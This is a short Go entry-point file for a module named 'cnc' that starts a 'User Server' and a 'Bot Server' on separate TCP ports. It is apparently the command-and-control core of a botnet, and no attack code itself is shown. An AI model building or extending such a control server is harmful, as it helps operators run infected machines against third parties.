// main.go
package main

import (
	"fmt"
	"net"

	"cnc/handlers"
	"cnc/models"
	"cnc/config"
)

func main() {
	users := models.ReadUsersInfo()
	accinfo := make([]models.AccInfo, config.MAXFDS)

	fmt.Println("User Server Started On", config.USER_SERVER_IP+":"+config.USER_SERVER_PORT)
	userListener, err := net.Listen("tcp", config.USER_SERVER_IP+":"+config.USER_SERVER_PORT)
	if err != nil {
		fmt.Println("Error Starting User Server:", err)
		return
	}
	defer userListener.Close()

	fmt.Println("Bot Server Started On", config.BOT_SERVER_IP+":"+config.BOT_SERVER_PORT)
	botListener, err := net.Listen("tcp", config.BOT_SERVER_IP+":"+config.BOT_SERVER_PORT)
	if err != nil {
		fmt.Println("Error Starting Bot Server:", err)
		return
	}
	defer botListener.Close()

	go handlers.StartUserServer(userListener, users, accinfo)
	handlers.StartBotServer(botListener)
}